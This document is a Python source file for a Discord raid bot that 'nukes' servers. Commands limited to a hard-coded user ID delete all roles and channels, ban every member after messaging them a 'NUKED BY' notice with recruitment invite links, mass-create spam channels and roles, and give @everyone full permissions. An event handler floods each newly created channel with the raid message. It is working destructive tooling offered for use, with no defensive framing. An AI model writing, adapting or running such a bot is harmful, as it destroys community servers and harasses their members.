# BSD 2-Clause License
#
# Copyright (c) 2023, Someone
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this
#   list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import discord
import requests
import sys
import json
import time
from discord.ext import commands
import threading
from threading import *

token = os.environ['TOKEN']
prefix = "lol?"
userid = [699162995871449129]

intents = discord.Intents.all()
#intents = discord.Intents.default() # Set Discord Intents to default
#intents = discord.Intents(guilds=True,members=True) # Change Discord intents

msg = """@everyone
NUKED BY SOMEONE1611
THE LAST NUKE
Join:
https://discord.gg/kE6pX6u6VA
https://discord.gg/zyzbdrDRQF
https://matrix.to/#/#sysadm:matrix.org
https://matrix.to/#/#spitetech:matrix.org
"""

bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

headers = {f"Authorization": f"Bot {token}"}


def create_text_channel(guild, name):
    data = {"name": name, "type": 0}

    r = requests.post(f"https://discord.com/api/v10/guilds/{guild}/channels",
                      headers=headers,
                      json=data)

    if "retry_after" in r.text:
        response = json.loads(r.text)
        time.sleep(int(response["retry_after"]))

    else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Created channel {name} [{r.status_code}]")
            pass
        else:
            print(f"Can't create channel {name} [{r.status_code}]")
            pass


def create_role(guild, name):
    data = {"name": name}

    r = requests.post(f"https://discord.com/api/v10/guilds/{guild}/roles",
                      headers=headers,
                      json=data)

    if "retry_after" in r.text:
        response = json.loads(r.text)
        time.sleep(int(response["retry_after"]))

    else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Created role {name} [{r.status_code}]")
            pass
        else:
            print(f"Can't create role {name} [{r.status_code}]")
            pass


def ban(guild, member):
    r = requests.put(
        f"https://discord.com/api/v10/guilds/{guild}/bans/{member}",
        headers=headers)
    if "retry_after" in r.text:
        response = json.loads(r.text)
        time.sleep(int(response["retry_after"]))
    else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Banned member {member} [{r.status_code}]")
            #print(r.text)
            pass
        else:
            print(f"Can't ban member {member} [{r.status_code}]")
            #print(r.text)
            pass


def delchan(channel):
    r = requests.delete(f"https://discord.com/api/v10/channels/{channel}",
                        headers=headers)
    if "retry_after" in r.text:
        response = json.loads(r.text)
        time.sleep(int(response["retry_after"]))
    else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Deleted channel {channel} [{r.status_code}]")
            #print(r.text)
            pass
        else:
            print(f"Can't delete channel {channel} [{r.status_code}]")
            pass


def delrole(guild, role):
    r = requests.delete(
        f"https://discord.com/api/v10/guilds/{guild}/roles/{role}",
        headers=headers)
    if "retry_after" in r.text:
        response = json.loads(r.text)
        time.sleep(int(response["retry_after"]))
    else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"Deleted role {role} [{r.status_code}]")
            #print(r.text)
            pass
        else:
            print(f"Can't delete role {role} [{r.status_code}]")
            #print(r.text)
            pass


@bot.command()
async def nuke(ctx):
    # First check if the author is executing command
    print("starting the nuke command ")

    if ctx.author.id in userid:
        # Proceed command
        guild = bot.get_guild(ctx.guild.id)

        for role in guild.roles:
            rolesdel = threading.Thread(target=delrole,
                                        args=(
                                            ctx.guild.id,
                                            role.id,
                                        ))
            rolesdel.start()
            rolesdel.join()

        for member in guild.members:
            if member.id in userid:
                print(f"Tried to not ban {member.id}")
                pass
            else:
                try:
                    await member.send(msg)
                except:
                    pass

                memberban = threading.Thread(target=ban,
                                             args=(
                                                 ctx.guild.id,
                                                 member.id,
                                             ))
                memberban.start()
                memberban.join()

        for channel in guild.channels:
            chandel = threading.Thread(target=delchan, args=(channel.id, ))
            chandel.start()
            memberban.join()

        rolesdel.join()
        memberban.join()
        chandel.join()

        await ctx.guild.create_text_channel("the-continous")

        print("Nuke command execution successfully completed")
    else:
        print(
            f"Lmao, {ctx.author} with ID {ctx.author.id} tried the nuke command"
        )
        pass


@bot.command()
async def nukenoban(ctx):
    # First check if the author is executing command
    print("starting the nuke command ")

    if ctx.author.id in userid:
        # Proceed command
        guild = bot.get_guild(ctx.guild.id)

        for role in guild.roles:
            rolesdel = threading.Thread(target=delrole,
                                        args=(
                                            ctx.guild.id,
                                            role.id,
                                        ))
            rolesdel.start()
            rolesdel.join()

        for channel in guild.channels:
            chandel = threading.Thread(target=delchan, args=(channel.id, ))
            chandel.start()
            memberban.join()

        rolesdel.join()
        memberban.join()
        chandel.join()

        await ctx.guild.create_text_channel("the-continous")

        print("Nukenoban command execution successfully completed")
    else:
        print(
            f"Lmao, {ctx.author} with ID {ctx.author.id} tried the nuke command"
        )
        pass


@bot.command()
async def badimpact(ctx):
    if ctx.author.id in userid:
        guild = bot.get_guild(ctx.guild.id)
        for member in guild.members:
            if member.id in userid:
                print(f"Tried to not ban {member.id}")
                pass
            else:
                memberban = threading.Thread(target=ban,
                                             args=(ctx.guild.id, member.id))
                memberban.start()
                memberban.join()

        memberban.join()
        print("banall command successfully completed!")

    else:
        print(
            f"Lmao, {ctx.author} with ID {ctx.author.id} tried the banall command"
        )


@bot.command()
async def spamch(ctx):
    if ctx.author.id in userid:
        #guild = bot.get_guild(ctx.guild.id)
        a = 1
        while a < 25:
            threading.Thread(target=create_text_channel,
                             args=(
                                 ctx.guild.id,
                                 "last-nuke",
                             )).start()
            #await ctx.guild.create_text_channel("nuked-by-multinational-raiders")
            a += 1
    else:
        print(
            f"Lmao, {ctx.author} with ID {ctx.author.id} tried the spamch command"
        )
        pass


@bot.command()
async def spamrole(ctx):
    if ctx.author.id in userid:
        #guild = bot.get_guild(ctx.guild.id)
        a = 1
        while a < 50:
            threading.Thread(target=create_role,
                             args=(
                                 ctx.guild.id,
                                 "One and no more",
                             )).start()
            #await ctx.guild.create_role(name="Nuked by Multinational Raiders")
            a += 1
    else:
        print(
            f"Lmao, {ctx.author} with ID {ctx.author.id} tried the spamrole command"
        )
        pass


@bot.event
async def on_ready():
    print(f"Bot name: {bot.user.name}")
    print(f"Bot ID: {bot.user.id}")
    print("If these information look incorrect, check your token again.\n")
    print(f"{bot.user.name}: I'm in these server:")

    async for guild in bot.fetch_guilds():
        print(f"{guild.name} - {guild.id}\n")
    """
	targetguild = 918884406331068466
	guild = bot.get_guild(targetguild)
	print(guild.channels)
	for channel in guild.text_channels:
		print(channel.name)
		invite = await channel.create_invite()
		print(invite)
	"""


@bot.command()
async def changeperms(ctx):
    try:
        role = discord.utils.get(ctx.guild.roles, name="@everyone")
        await role.edit(permissions=discord.Permissions.all())
        print("ok")
    except:
        print("failed to change the permission")


@bot.event
async def on_guild_channel_create(channel):
    print("A guild created a channel!!")
    a = 1
    while a < 16:
        await channel.send(msg)
        a += 1


if __name__ == "__main__":
    try:
        bot.run(token)
    except KeyboardInterrupt:
        print("\n\nKeyboardInterrupt > > > Exiting...")
        sys.exit(0)
